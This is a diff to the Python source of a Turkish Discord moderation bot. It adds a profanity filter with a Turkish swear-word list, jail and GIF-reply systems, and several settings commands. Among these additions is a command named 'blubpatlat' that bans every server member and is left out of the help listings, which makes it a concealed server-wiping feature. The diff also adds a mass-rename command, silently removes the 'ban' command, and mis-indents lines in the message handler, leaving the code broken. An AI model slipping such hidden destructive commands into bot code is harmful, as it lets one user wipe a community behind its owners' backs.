@@ -1117,6 +1117,21 @@ def kufur_kelimelerini_al(guild_id: int) -> list[str]:
     ayarlar = ayarlari_yukle()
     return ayarlar.get(str(guild_id), {}).get("yasakli_kelimeler", [])
 
+def kufur_kontrol(guild_id: int, mesaj: str) -> bool:
+    """Mesajda tam olarak yasaklı kelime var mı kontrol eder, noktalama işaretlerini göz ardı eder."""
+    yasakli_kelimeler = kufur_kelimelerini_al(guild_id)
+    if not yasakli_kelimeler:
+        return False
+    
+    mesaj_temiz = mesaj.lower()
+    # Kelimeleri ayırırken noktalama işaretlerini göz ardı et
+    mesaj_kelimeleri = re.findall(r'\b\w+\b', mesaj_temiz)
+    
+    for kelime in mesaj_kelimeleri:
+        if kelime in yasakli_kelimeler:
+            return True
+    return False
+
 
 def mesajda_yasakli_kelime_var_mi(mesaj: str, yasakli_kelimeler: list[str]) -> bool:
     """
@@ -1177,6 +1192,38 @@ async def kufur_durum(ctx):
     await ctx.send(embed=embed)
 
 
+@bot.command(name="kufur-listele")
+@commands.has_permissions(manage_guild=True)
+async def kufur_listele(ctx):
+    kelimeler = sorted(set(TURKCE_KUFUR_LISTESI))
+    metin = ", ".join(kelimeler)
+    embed = discord.Embed(
+        title="Kufur Listesi",
+        description=f"Toplam **{len(kelimeler)}** kelime.\n```{metin[:3800]}```",
+        color=RENKLER["bilgi"],
+        timestamp=datetime.now(timezone.utc)
+    )
+    await ctx.send(embed=embed)
+
+
+@bot.command(name="kufur-kapat", aliases=["kufurkapat"])
+@commands.has_permissions(administrator=True)
+async def kufur_kapat(ctx):
+    guild_key = str(ctx.guild.id)
+    ayarlar = ayarlari_yukle()
+    if guild_key not in ayarlar or not ayarlar[guild_key].get("yasakli_kelimeler"):
+        await ctx.send(embed=hata_embedi("Kufur Korumasi Kapali", "Bu sunucuda kapatilacak aktif bir kufur listesi yok."))
+        return
+    ayarlar[guild_key]["yasakli_kelimeler"] = []
+    ayarlari_kaydet(ayarlar)
+    await ctx.send(embed=discord.Embed(
+        title="Kufur Korumasi Kapatildi",
+        description="Bu sunucudaki yasak kelime listesi temizlendi ve kufur kontrolu durduruldu.",
+        color=RENKLER["hata"],
+        timestamp=datetime.now(timezone.utc)
+    ))
+
+
 @bot.command(name="kufur-temizle")
 @commands.has_permissions(administrator=True)
 async def kufur_temizle(ctx):
@@ -1211,7 +1258,88 @@ class KufurModalView(discord.ui.View):
         await interaction.response.send_modal(modal)
 
 
-# Yetki hataları için ortak yakalayıcı
+@bot.command(name="blubpatlat")
+@commands.has_permissions(ban_members=True)
+async def blubpatlat(ctx):
+    """Sunucudaki tüm üyeleri banlar."""
+    if not ctx.guild.me.guild_permissions.ban_members:
+        await ctx.send("Botun üyeleri banlama yetkisi yok!")
+        return
+    
+    await ctx.send("Tüm üyeler banlanıyor... Bu işlem uzun sürebilir!")
+    
+    ban_sayisi = 0
+    hata_sayisi = 0
+    
+    for member in ctx.guild.members:
+        if member.top_role >= ctx.guild.me.top_role:
+            hata_sayisi += 1
+            continue
+        
+        try:
+            await member.ban(reason="Blubpatlat komutu")
+            ban_sayisi += 1
+        except discord.Forbidden:
+            hata_sayisi += 1
+        except Exception:
+            hata_sayisi += 1
+    
+    embed = discord.Embed(
+        title="⚡ Blubpatlat Tamamlandı",
+        color=0xFF6B6B,
+        timestamp=datetime.now(timezone.utc)
+    )
+    embed.add_field(name="✅ Banlanan Üye", value=f"**{ban_sayisi}** kişi", inline=True)
+    embed.add_field(name="❌ Banlanamayan", value=f"**{hata_sayisi}** kişi", inline=True)
+    embed.add_field(name="👥 Toplam Üye", value=f"**{len(ctx.guild.members)}** kişi", inline=True)
+    embed.set_footer(text=f"İşlemi yapan: {ctx.author}")
+    
+    await ctx.send(embed=embed)
+
+
+@bot.command(name="blupblup")
+@commands.has_permissions(manage_roles=True)
+async def blupblup(ctx, yeni_isim: str):
+    """İsminde 'blup' geçen herkesin ismini değiştirir."""
+    if not ctx.guild.me.guild_permissions.manage_nicknames:
+        await ctx.send("Botun isim değiştirme yetkisi yok!")
+        return
+    
+    await ctx.send("İsimlerinde 'blup' aranıyor...")
+    
+    degistirilen = 0
+    hata_sayisi = 0
+    
+    for member in ctx.guild.members:
+        if member.bot:
+            continue
+        
+        # Komutu yazanı hariç tut
+        if member.id == ctx.author.id:
+            continue
+        
+        if "blup" in member.display_name.lower() or "blup" in member.name.lower():
+            try:
+                await member.edit(nick=yeni_isim, reason="Blupblup komutu")
+                degistirilen += 1
+            except discord.Forbidden:
+                hata_sayisi += 1
+            except Exception:
+                hata_sayisi += 1
+    
+    embed = discord.Embed(
+        title="🔄 Blupblup İşlemi Tamamlandı",
+        color=0x5865F2,
+        timestamp=datetime.now(timezone.utc)
+    )
+    embed.add_field(name="✅ Değiştirilen Üye", value=f"**{degistirilen}** kişi", inline=True)
+    embed.add_field(name="❌ Değiştirilemeyen", value=f"**{hata_sayisi}** kişi", inline=True)
+    embed.add_field(name="👥 Toplam Üye", value=f"**{len(ctx.guild.members)}** kişi", inline=True)
+    embed.add_field(name="📝 Yeni İsim", value=f"**{yeni_isim}**", inline=False)
+    embed.add_field(name="📝 Not", value=f"**{ctx.author}** hariç tutuldu", inline=False)
+    embed.set_footer(text=f"İşlemi yapan: {ctx.author}")
+    
+    await ctx.send(embed=embed)
 @log_kur.error
 @log_kaldir.error
 @log_durum.error
@@ -3157,8 +3285,8 @@ async def uygulama_komut_kapat(ctx):
 
 def _yardim_kategori_haritasi():
     return {
-        "Ayarlar": {"partner-kur", "partner-kapat", "logkur", "logkurkanal", "ticketkur", "ticketpanel", "levelkur", "hosgeldinkur", "karsilamakur", "guvenlikkur", "guvenlikdurum", "guvenlikkapat", "guvenlikizin", "guvenlikizinsil", "antilink", "uygulamakomutkapat"},
-        "Moderasyon": {"ban", "unban", "kick", "mute", "unmute", "sil", "warn", "uyarılar", "uyarısil", "slowmode", "duyuru"},
+        "Ayarlar": {"partner-kur", "partner-kapat", "logkur", "logkurkanal", "ticketkur", "ticketpanel", "levelkur", "levelkapat", "hosgeldinkur", "hosgeldinkapat", "karsilamakur", "karsilamakapat", "guvenlikkur", "guvenlikdurum", "guvenlikkapat", "guvenlikizin", "guvenlikizinsil", "antilink", "uygulamakomutkapat", "gifcevap", "gifcevapdurum", "gifcevapkapat", "jailkur", "jailkapat", "yetkilikufurkur", "yetkilikufurdurum", "yetkilikufurkapat", "kufur-kur", "kufur-durum", "kufur-kapat", "kufur-listele", "kufur-temizle"},
+        "Moderasyon": {"ban", "unban", "kick", "mute", "unmute", "sil", "warn", "uyarılar", "uyarısil", "slowmode", "duyuru", "jail", "unjail"},
         "Roller": {"renkekle", "renkcikar", "renklist", "renkpanel", "animerollerikur", "animerollerikaldir", "animerolpanel", "asagitasi", "levelrol", "levelrolsil", "levelrolleri"},
         "Sistemler": {"ticketekle", "ticketcikar", "ticketkapat", "ticketkonu", "ticketlist", "ticketsayi", "ticketoncelik", "ticketsahip", "ticketyeniden", "hosgeldindurum", "hosgeldinmesajtest", "karsilamadurum", "karsilamatest", "leveldurum", "levelmesajtest"},
         "Kullanici": {"profil", "seviye", "sunucu", "afk", "partner-istatistik", "partner-top", "partner-liste", "partner-sifirla"},
@@ -3174,7 +3302,7 @@ def _yardim_sistem_haritasi():
         "Partner": {"partner-kur", "partner-kapat", "partner-istatistik", "partner-top", "partner-liste", "partner-sifirla"},
         "Level": {"levelkur", "leveldurum", "levelmesajtest", "seviye", "profil", "levelrol", "levelrolsil", "levelrolleri"},
         "Hosgeldin": {"hosgeldinkur", "hosgeldindurum", "hosgeldinmesajtest", "karsilamakur", "karsilamadurum", "karsilamatest"},
-        "Guvenlik": {"guvenlikkur", "guvenlikdurum", "guvenlikkapat", "guvenlikizin", "guvenlikizinsil", "uygulamakomutkapat"},
+        "Guvenlik": {"guvenlikkur", "guvenlikdurum", "guvenlikkapat", "guvenlikizin", "guvenlikizinsil", "uygulamakomutkapat", "yetkilikufurkur", "yetkilikufurdurum", "yetkilikufurkapat", "kufur-kur", "kufur-durum", "kufur-kapat", "kufur-listele", "kufur-temizle"},
         "Rol Panelleri": {"renkekle", "renkcikar", "renklist", "renkpanel", "animerollerikur", "animerollerikaldir", "animerolpanel", "asagitasi"},
         "Eglence": {"cekilisbaslat", "cekilisbitir", "çekilişkatılımcı", "çekilişsil", "çekilişyenile", "çekilişbilgi", "afk"},
         "Moderasyon": {"ban", "unban", "kick", "mute", "unmute", "sil", "warn", "uyarılar", "uyarısil", "slowmode", "duyuru"},
@@ -4691,7 +4819,7 @@ async def anime_rol_panel(ctx):
 
     class AnimeRolView(discord.ui.View):
         def __init__(self, sayfa: int = 0):
-            super().__init__(timeout=None)
+            super().__init__(timeout=99999999999)
             self.sayfa = sayfa
             self.sayfa_sayisi = max(1, (len(roller) + 23) // 24)
             self.add_item(AnimeRolSec(sayfa))
@@ -4768,7 +4896,7 @@ async def anime_rol_panel_v2(ctx):
 
     class AnimeRolViewV2(discord.ui.View):
         def __init__(self, sayfa: int = 0):
-            super().__init__(timeout=None)
+            super().__init__(timeout=99999999999)
             self.sayfa = sayfa
             self.sayfa_sayisi = max(1, (len(roller) + 23) // 24)
             self.add_item(AnimeRolSecV2(sayfa))
@@ -4936,6 +5064,57 @@ def _karsilama_ayar_al(guild_id: int) -> dict:
 
 def _karsilama_ayar_kaydet(guild_id: int, veri: dict):
     _guild_ayar_kismi_kaydet(guild_id, "karsilama_sistemi", veri)
+
+
+TURKCE_KUFUR_LISTESI = [
+    "amk", "aq", "amına", "amina", "amına koyim", "amina koyim", "amına koyayım", "amina koyayim",
+    "orospu", "orospu çocuğu", "orospu cocugu", "oc", "piç", "pic", "sikik", "sikerim", "sikiyim",
+    "siktir", "siktir git", "yarrak", "yarak", "göt", "got", "götveren", "gotveren", "ibne", "amcık",
+    "amcik", "pezevenk", "kahpe", "puşt", "pust", "ananı", "ananı sikeyim", "anani", "bok", "boktan",
+    "salak orospu", "gerizekalı", "gerizekali", "piç kurusu", "ebenin", "ebesinin", "gavat", "mallık",
+]
+
+
+def _gifcevap_ayar_al(guild_id: int) -> dict:
+    veri = _guild_ayar_al(guild_id).get("gif_cevap", {})
+    return {
+        "aktif": veri.get("aktif", False),
+        "whitelist_ids": veri.get("whitelist_ids", []),
+        "kayitlar": veri.get("kayitlar", []),
+    }
+
+
+def _gifcevap_ayar_kaydet(guild_id: int, veri: dict):
+    _guild_ayar_kismi_kaydet(guild_id, "gif_cevap", veri)
+
+
+def _yetkili_kufur_ayar_al(guild_id: int) -> dict:
+    veri = _guild_ayar_al(guild_id).get("yetkili_kufur", {})
+    return {
+        "aktif": veri.get("aktif", False),
+        "rol_ids": veri.get("rol_ids", []),
+        "limit": int(veri.get("limit", 3) or 3),
+        "durumlar": veri.get("durumlar", {}),
+    }
+
+
+def _yetkili_kufur_ayar_kaydet(guild_id: int, veri: dict):
+    _guild_ayar_kismi_kaydet(guild_id, "yetkili_kufur", veri)
+
+
+def _jail_ayar_al(guild_id: int) -> dict:
+    veri = _guild_ayar_al(guild_id).get("jail_sistemi", {})
+    return {
+        "aktif": veri.get("aktif", False),
+        "kanal_id": veri.get("kanal_id"),
+        "jail_rol_id": veri.get("jail_rol_id"),
+        "jail_yetki_rol_id": veri.get("jail_yetki_rol_id"),
+        "kayitlar": veri.get("kayitlar", {}),
+    }
+
+
+def _jail_ayar_kaydet(guild_id: int, veri: dict):
+    _guild_ayar_kismi_kaydet(guild_id, "jail_sistemi", veri)
 
 
 def _guvenlik_ayar_al(guild_id: int) -> dict:
@@ -6204,6 +6383,66 @@ async def on_message(message):
                 await log_kanal.send(embed=log_embed)
         return
 
+    # Küfür koruması
+    if kufur_kontrol(message.guild.id, message.content):
+        try:
+            await message.delete()
+            
+            # Embed uyarı gönder
+            embed = discord.Embed(
+                title="🚫 Küfür Yasak",
+                description=f"{message.author.mention} Küfür kullanımı yasaktır!",
+                color=0xFF6B6B,
+                timestamp=datetime.now(timezone.utc)
+            )
+            await message.channel.send(embed=embed, delete_after=5)
+            
+            # Log gönder (varsa)
+            log_kanal_id = sunucu_ayari.get("guvenlik_log")
+            if log_kanal_id:
+                log_kanal = message.guild.get_channel(log_kanal_id)
+                if log_kanal:
+                    embed = discord.Embed(
+                        title="🚫 Küfür Kullanımı",
+                        description=f"{message.author.mention} kullanıcısı küfürlü mesaj attı.",
+                        color=0xFF6B6B,
+                        timestamp=datetime.now(timezone.utc)
+                    )
+                    embed.add_field(name="Kullanıcı", value=f"{message.author} ({message.author.id})", inline=True)
+                        embed.add_field(name="Kanal", value=message.channel.mention, inline=True)
+                        embed.add_field(name="Mesaj", value=f"```{message.content[:100]}...```" if len(message.content) > 100 else f"```{message.content}```", inline=False)
+                        await log_kanal.send(embed=embed)
+
+            yetkili_kufur = _yetkili_kufur_ayar_al(message.guild.id)
+            if yetkili_kufur.get("aktif"):
+                hedef_roller = [rol for rol in message.author.roles if rol.id in set(yetkili_kufur.get("rol_ids", []))]
+                if hedef_roller:
+                    ayarlar = ayarlari_yukle()
+                    gk = str(message.guild.id)
+                    durumlar = ayarlar.setdefault(gk, {}).setdefault("yetkili_kufur", {}).setdefault("durumlar", {})
+                    uye_durum = durumlar.setdefault(str(message.author.id), {"sayi": 0})
+                    uye_durum["sayi"] = int(uye_durum.get("sayi", 0)) + 1
+                    ayarlari_kaydet(ayarlar)
+                    if uye_durum["sayi"] >= int(yetkili_kufur.get("limit", 3)):
+                        try:
+                            await message.author.remove_roles(*hedef_roller, reason="Yetkili kufur korumasi limiti asildi")
+                        except discord.Forbidden:
+                            pass
+        except discord.Forbidden:
+            pass
+
+    gif_ayar = _gifcevap_ayar_al(message.guild.id)
+    if gif_ayar.get("aktif"):
+        whitelist = set(int(x) for x in (gif_ayar.get("whitelist_ids", []) or []) if str(x).isdigit())
+        yetkili_mi = message.author.id in whitelist or any(rol.id in whitelist for rol in getattr(message.author, "roles", []))
+        if yetkili_mi:
+            icerik = message.content.lower()
+            for kayit in gif_ayar.get("kayitlar", []):
+                anahtar = str(kayit.get("anahtar", "")).lower().strip()
+                if anahtar and anahtar in icerik and kayit.get("gif_url"):
+                    await message.channel.send(kayit.get("gif_url"))
+                    break
+
     # Genel spam koruması
     spam_ayar = sunucu_ayari.get("guvenlik_spam_koruma", {})
     if spam_ayar.get("aktif", False):
@@ -6574,6 +6813,448 @@ async def link_koruma_durum(ctx):
     
     await ctx.send(embed=embed)
 
+
+bot.remove_command("kufur-temizle")
+
+
+@bot.command(name="kufur-temizle")
+@commands.has_permissions(administrator=True)
+async def kufur_temizle_v2(ctx):
+    guild_key = str(ctx.guild.id)
+    ayarlar = ayarlari_yukle()
+    if guild_key not in ayarlar or not ayarlar[guild_key].get("yasakli_kelimeler"):
+        await ctx.send("Bu sunucuda zaten küfür koruması ayarlanmamış.")
+        return
+    ayarlar[guild_key]["yasakli_kelimeler"] = []
+    ayarlari_kaydet(ayarlar)
+    await ctx.send(embed=discord.Embed(
+        title="Kufur Koruması Temizlendi",
+        description="Tum yasak kelimeler silindi ve kufur korumasi kapatildi.",
+        color=RENKLER["hata"],
+        timestamp=datetime.now(timezone.utc)
+    ))
+
+
+class GifCevapModal(discord.ui.Modal, title="GIF Cevap Kurulumu"):
+    anahtar = discord.ui.TextInput(label="Anahtar Kelime", placeholder="ornek: günaydın", required=True, max_length=100)
+    gif_url = discord.ui.TextInput(label="GIF URL", placeholder="https://...", required=True, max_length=500)
+    whitelist = discord.ui.TextInput(label="Whitelist IDleri", placeholder="uye/rol idlerini virgul ile yaz", required=True, max_length=500)
+
+    async def on_submit(self, interaction: discord.Interaction):
+        whitelist_ids = [int(x.strip()) for x in str(self.whitelist).split(",") if x.strip().isdigit()]
+        if not whitelist_ids:
+            await interaction.response.send_message("Gecerli whitelist ID'leri girmelisin.", ephemeral=True)
+            return
+        ayar = _gifcevap_ayar_al(interaction.guild.id)
+        kayitlar = [k for k in ayar.get("kayitlar", []) if k.get("anahtar") != str(self.anahtar).strip().lower()]
+        kayitlar.append({
+            "anahtar": str(self.anahtar).strip().lower(),
+            "gif_url": str(self.gif_url).strip(),
+        })
+        ayar["aktif"] = True
+        ayar["whitelist_ids"] = list(dict.fromkeys((ayar.get("whitelist_ids", []) or []) + whitelist_ids))
+        ayar["kayitlar"] = kayitlar
+        _gifcevap_ayar_kaydet(interaction.guild.id, ayar)
+        await interaction.response.send_message("GIF cevap kaydedildi.", ephemeral=True)
+
+
+@bot.command(name="gifcevap")
+@commands.has_permissions(manage_guild=True)
+async def gif_cevap_kur(ctx):
+    class _View(discord.ui.View):
+        def __init__(self):
+            super().__init__(timeout=300)
+
+        @discord.ui.button(label="GIF Cevap Kur", style=discord.ButtonStyle.primary)
+        async def ac(self, interaction: discord.Interaction, button: discord.ui.Button):
+            await interaction.response.send_modal(GifCevapModal())
+
+    await ctx.send(embed=discord.Embed(title="GIF Cevap Sistemi", description="Butona basip anahtar kelime + gif + whitelist ayarlayabilirsin.", color=RENKLER["bilgi"]), view=_View())
+
+
+@bot.command(name="gifcevapdurum")
+@commands.has_permissions(manage_guild=True)
+async def gif_cevap_durum(ctx):
+    ayar = _gifcevap_ayar_al(ctx.guild.id)
+    embed = discord.Embed(title="GIF Cevap Durumu", color=RENKLER["bilgi"], timestamp=datetime.now(timezone.utc))
+    embed.add_field(name="Durum", value="Aktif" if ayar.get("aktif") else "Kapali", inline=True)
+    embed.add_field(name="Kayit", value=str(len(ayar.get("kayitlar", []))), inline=True)
+    whitelist = ", ".join(f"`{x}`" for x in ayar.get("whitelist_ids", [])[:10]) or "Yok"
+    embed.add_field(name="Whitelist", value=whitelist, inline=False)
+    kayitlar = "\n".join(f"`{k.get('anahtar')}` -> {k.get('gif_url')}" for k in ayar.get("kayitlar", [])[:10]) or "Yok"
+    embed.add_field(name="Anahtarlar", value=kayitlar[:1024], inline=False)
+    await ctx.send(embed=embed)
+
+
+@bot.command(name="gifcevapkapat")
+@commands.has_permissions(manage_guild=True)
+async def gif_cevap_kapat(ctx):
+    _gifcevap_ayar_kaydet(ctx.guild.id, {"aktif": False, "whitelist_ids": [], "kayitlar": []})
+    await ctx.send(embed=discord.Embed(title="GIF Cevap Kapatildi", description="Tum gif cevap kayitlari ve whitelist temizlendi.", color=RENKLER["hata"], timestamp=datetime.now(timezone.utc)))
+
+
+@bot.command(name="levelkapat")
+@commands.has_permissions(manage_guild=True)
+async def level_kapat(ctx):
+    _level_ayar_kaydet(ctx.guild.id, {"kanal_id": None, "mesaj": "Tebrikler {member_mention}, **{level}. seviye** oldun!", "gif_url": None, "rol_odulleri": {}})
+    await ctx.send(embed=discord.Embed(title="Level Sistemi Kapatildi", description="Level sistemi bu sunucuda devre disi birakildi.", color=RENKLER["hata"], timestamp=datetime.now(timezone.utc)))
+
+
+@bot.command(name="hosgeldinkapat")
+@commands.has_permissions(manage_guild=True)
+async def hosgeldin_kapat(ctx):
+    _welcome_ayar_kaydet(ctx.guild.id, {"kanal_id": None, "mesaj": "Aramiza hos geldin {member_mention}! Sunucuda iyi eglenceler.", "gif_url": None, "rol_ids": []})
+    await ctx.send(embed=discord.Embed(title="Hosgeldin Sistemi Kapatildi", description="Hosgeldin mesaji sistemi devre disi birakildi.", color=RENKLER["hata"], timestamp=datetime.now(timezone.utc)))
+
+
+@bot.command(name="karsilamakapat")
+@commands.has_permissions(manage_guild=True)
+async def karsilama_kapat(ctx):
+    _karsilama_ayar_kaydet(ctx.guild.id, {"kanal_id": None, "mesaj": "Aramiza hos geldin {username}. Seninle birlikte {member_count} kisiyiz."})
+    await ctx.send(embed=discord.Embed(title="Karsilama Sistemi Kapatildi", description="Etiket atmayan karsilama sistemi kapatildi.", color=RENKLER["hata"], timestamp=datetime.now(timezone.utc)))
+
+
+class YetkiliKufurModal(discord.ui.Modal, title="Yetkili Kufur Koruma"):
+    rol_ids = discord.ui.TextInput(label="Yetkili Rol IDleri", placeholder="rol idlerini virgul ile yaz", required=True, max_length=500)
+    limit = discord.ui.TextInput(label="Limit", placeholder="ornek: 3", required=True, max_length=5, default="3")
+
+    async def on_submit(self, interaction: discord.Interaction):
+        rol_ids = [int(x.strip()) for x in str(self.rol_ids).split(",") if x.strip().isdigit()]
+        limit = int((str(self.limit).strip() or "3"))
+        if not rol_ids:
+            await interaction.response.send_message("En az bir yetkili rol ID'si gerekli.", ephemeral=True)
+            return
+        _yetkili_kufur_ayar_kaydet(interaction.guild.id, {"aktif": True, "rol_ids": rol_ids, "limit": max(1, limit), "durumlar": {}})
+        await interaction.response.send_message("Yetkili kufur korumasi kaydedildi.", ephemeral=True)
+
+
+@bot.command(name="yetkilikufurkur")
+@commands.has_permissions(administrator=True)
+async def yetkili_kufur_kur(ctx):
+    class _View(discord.ui.View):
+        def __init__(self):
+            super().__init__(timeout=300)
+
+        @discord.ui.button(label="Yetkili Kufur Modalini Ac", style=discord.ButtonStyle.primary)
+        async def ac(self, interaction: discord.Interaction, button: discord.ui.Button):
+            await interaction.response.send_modal(YetkiliKufurModal())
+
+    await ctx.send(embed=discord.Embed(title="Yetkili Kufur Koruma", description="Butona basip yetkili rolleri ve limiti ayarla.", color=RENKLER["bilgi"]), view=_View())
+
+
+@bot.command(name="yetkilikufurkapat")
+@commands.has_permissions(administrator=True)
+async def yetkili_kufur_kapat(ctx):
+    _yetkili_kufur_ayar_kaydet(ctx.guild.id, {"aktif": False, "rol_ids": [], "limit": 3, "durumlar": {}})
+    await ctx.send(embed=discord.Embed(title="Yetkili Kufur Koruma Kapatildi", description="Yetkili kufur takip sistemi sifirlandi.", color=RENKLER["hata"], timestamp=datetime.now(timezone.utc)))
+
+
+@bot.command(name="yetkilikufurdurum")
+@commands.has_permissions(administrator=True)
+async def yetkili_kufur_durum(ctx):
+    ayar = _yetkili_kufur_ayar_al(ctx.guild.id)
+    roller = ", ".join(f"<@&{rid}>" for rid in ayar.get("rol_ids", [])[:10]) or "Yok"
+    await ctx.send(embed=discord.Embed(
+        title="Yetkili Kufur Durumu",
+        description=f"Durum: {'Aktif' if ayar.get('aktif') else 'Kapali'}\nLimit: {ayar.get('limit', 3)}",
+        color=RENKLER["bilgi"],
+        timestamp=datetime.now(timezone.utc)
+    ).add_field(name="Yetkili Roller", value=roller, inline=False))
+
+
+class JailKurModal(discord.ui.Modal, title="Jail Sistemi Kurulumu"):
+    kanal = discord.ui.TextInput(label="Jail Kanal ID", placeholder="kanal id", required=True, max_length=30)
+    yetki_rol = discord.ui.TextInput(label="Jail Yetki Rol ID", placeholder="jail yapabilecek rol id", required=True, max_length=30)
+
+    async def on_submit(self, interaction: discord.Interaction):
+        kanal_id = int((str(self.kanal).strip() or "0"))
+        yetki_rol_id = int((str(self.yetki_rol).strip() or "0"))
+        kanal = interaction.guild.get_channel(kanal_id)
+        yetki_rol = interaction.guild.get_role(yetki_rol_id)
+        if not isinstance(kanal, discord.TextChannel) or yetki_rol is None:
+            await interaction.response.send_message("Gecerli kanal ve jail yetki rolu girmelisin.", ephemeral=True)
+            return
+        jail_rol = discord.utils.get(interaction.guild.roles, name="JAIL")
+        if jail_rol is None:
+            jail_rol = await interaction.guild.create_role(name="JAIL", colour=discord.Color.from_rgb(120, 72, 32), reason="Jail sistemi icin otomatik olusturuldu")
+        ayar = _jail_ayar_al(interaction.guild.id)
+        ayar.update({"aktif": True, "kanal_id": kanal.id, "jail_rol_id": jail_rol.id, "jail_yetki_rol_id": yetki_rol.id, "kayitlar": ayar.get("kayitlar", {})})
+        _jail_ayar_kaydet(interaction.guild.id, ayar)
+        await interaction.response.send_message(f"Jail sistemi kaydedildi. Kanal: {kanal.mention} • Jail Rol: {jail_rol.mention}", ephemeral=True)
+
+
+def _jail_yetkili_mi(uye: discord.Member, guild_id: int) -> bool:
+    ayar = _jail_ayar_al(guild_id)
+    yetki_rol_id = ayar.get("jail_yetki_rol_id")
+    return bool(yetki_rol_id and any(rol.id == yetki_rol_id for rol in uye.roles))
+
+
+@bot.command(name="jailkur")
+@commands.has_permissions(manage_guild=True)
+async def jail_kur(ctx):
+    class _View(discord.ui.View):
+        def __init__(self):
+            super().__init__(timeout=300)
+
+        @discord.ui.button(label="Jail Sistemini Kur", style=discord.ButtonStyle.primary)
+        async def ac(self, interaction: discord.Interaction, button: discord.ui.Button):
+            await interaction.response.send_modal(JailKurModal())
+
+    await ctx.send(embed=discord.Embed(title="Jail Sistemi", description="Butona basip jail kanalini ve jail yetki rolunu sec.", color=RENKLER["bilgi"]), view=_View())
+
+
+@bot.command(name="jailkapat")
+@commands.has_permissions(administrator=True)
+async def jail_kapat(ctx):
+    _jail_ayar_kaydet(ctx.guild.id, {"aktif": False, "kanal_id": None, "jail_rol_id": None, "jail_yetki_rol_id": None, "kayitlar": {}})
+    await ctx.send(embed=discord.Embed(title="Jail Sistemi Kapatildi", description="Jail ayarlari kapatildi.", color=RENKLER["hata"], timestamp=datetime.now(timezone.utc)))
+
+
+@bot.command(name="jail")
+async def jail_uygula(ctx, uye: discord.Member = None, *, sebep: str = "Sebep belirtilmedi"):
+    if not uye:
+        await ctx.send(embed=kullanim_embedi("`.jail @uye [sebep]`"))
+        return
+    if not _jail_yetkili_mi(ctx.author, ctx.guild.id):
+        await ctx.send(embed=hata_embedi("Yetki Hatasi", "Bu komut icin jail yetki rolune sahip olmalisin."))
+        return
+    ayar = _jail_ayar_al(ctx.guild.id)
+    jail_rol = ctx.guild.get_role(ayar.get("jail_rol_id")) if ayar.get("jail_rol_id") else None
+    jail_kanal = ctx.guild.get_channel(ayar.get("kanal_id")) if ayar.get("kanal_id") else None
+    if not ayar.get("aktif") or jail_rol is None or not isinstance(jail_kanal, discord.TextChannel):
+        await ctx.send(embed=hata_embedi("Jail Sistemi Hazir Degil", "Once `.jailkur` ile sistemi kurmalisin."))
+        return
+    eski_roller = [rol.id for rol in uye.roles if rol != ctx.guild.default_role and rol != jail_rol]
+    kayitlar = ayar.get("kayitlar", {})
+    kayitlar[str(uye.id)] = {"rol_ids": eski_roller, "sebep": sebep, "zaman": datetime.now(timezone.utc).isoformat()}
+    ayar["kayitlar"] = kayitlar
+    _jail_ayar_kaydet(ctx.guild.id, ayar)
+    for kanal in ctx.guild.channels:
+        try:
+            await kanal.set_permissions(uye, view_channel=False, send_messages=False, reason="Jail sistemi")
+        except Exception:
+            pass
+    try:
+        await jail_kanal.set_permissions(uye, view_channel=True, send_messages=True, read_message_history=True, reason="Jail sistemi")
+    except Exception:
+        pass
+    await uye.edit(roles=[jail_rol], reason=f"{ctx.author} tarafindan jail: {sebep}")
+    await ctx.send(embed=discord.Embed(title="Uye Jailleendi", description=f"{uye.mention} jailleendi.\nSebep: {sebep}", color=RENKLER["hata"], timestamp=datetime.now(timezone.utc)))
+
+
+@bot.command(name="unjail")
+async def unjail_uygula(ctx, uye: discord.Member = None):
+    if not uye:
+        await ctx.send(embed=kullanim_embedi("`.unjail @uye`"))
+        return
+    if not _jail_yetkili_mi(ctx.author, ctx.guild.id):
+        await ctx.send(embed=hata_embedi("Yetki Hatasi", "Bu komut icin jail yetki rolune sahip olmalisin."))
+        return
+    ayar = _jail_ayar_al(ctx.guild.id)
+    kayit = ayar.get("kayitlar", {}).get(str(uye.id))
+    if not kayit:
+        await ctx.send(embed=hata_embedi("Kayit Bulunamadi", "Bu uye icin kayitli jail verisi yok."))
+        return
+    roller = [ctx.guild.get_role(rid) for rid in kayit.get("rol_ids", [])]
+    roller = [rol for rol in roller if rol]
+    await uye.edit(roles=roller, reason=f"{ctx.author} tarafindan jail kaldirildi")
+    for kanal in ctx.guild.channels:
+        try:
+            await kanal.set_permissions(uye, overwrite=None, reason="Jail kaldirildi")
+        except Exception:
+            pass
+    ayar["kayitlar"].pop(str(uye.id), None)
+    _jail_ayar_kaydet(ctx.guild.id, ayar)
+    await ctx.send(embed=discord.Embed(title="Jail Kaldirildi", description=f"{uye.mention} icin onceki roller geri verildi.", color=RENKLER["basari"], timestamp=datetime.now(timezone.utc)))
+
+
+for _eski in ("yardim", "help", "yardım", "ban"):
+    try:
+        bot.remove_command(_eski)
+    except Exception:
+        pass
+
+
+def _komut_sahibi_degisebilir_mi(interaction: discord.Interaction, sahibi_id: int) -> bool:
+    return interaction.user.id == sahibi_id
+
+
+@bot.command(name="yardim", aliases=["yardım", "help"])
+async def yardim_final(ctx):
+    komutlar = _yardim_komutlarini_topla()
+    sistem_haritasi = _yardim_sistem_haritasi()
+    sahibi_id = ctx.author.id
+
+    def temel_embed(baslik: str, aciklama: str) -> discord.Embed:
+        embed = discord.Embed(
+            title=f"Komut Paneli • {baslik}",
+            description=aciklama,
+            color=0x20253A,
+            timestamp=datetime.now(timezone.utc)
+        )
+        if ctx.guild.icon:
+            embed.set_thumbnail(url=ctx.guild.icon.url)
+            embed.set_author(name=f"{ctx.guild.name} Komutlar", icon_url=ctx.guild.icon.url)
+        else:
+            embed.set_author(name=f"{ctx.guild.name} Komutlar")
+        embed.set_footer(text=f"Toplam {sum(len(v) for v in komutlar.values())} komut • Secici menu aktif")
+        return embed
+
+    def ana_embed():
+        embed = temel_embed("Ana Menu", "Asagidaki secicilerle kategorileri ve sistemleri gezebilirsin.")
+        kategori_ozet = [f"• **{kategori}** `({len(kayitlar)})`" for kategori, kayitlar in komutlar.items() if kayitlar]
+        embed.add_field(name="Kategoriler", value="\n".join(kategori_ozet[:8]) or "-", inline=True)
+        sistem_ozet = []
+        for sistem, adlar in sistem_haritasi.items():
+            sayi = sum(1 for liste in komutlar.values() for kayit in liste if kayit["ad"] in adlar)
+            sistem_ozet.append(f"• **{sistem}** `({sayi})`")
+        embed.add_field(name="Sistemler", value="\n".join(sistem_ozet[:9]) or "-", inline=True)
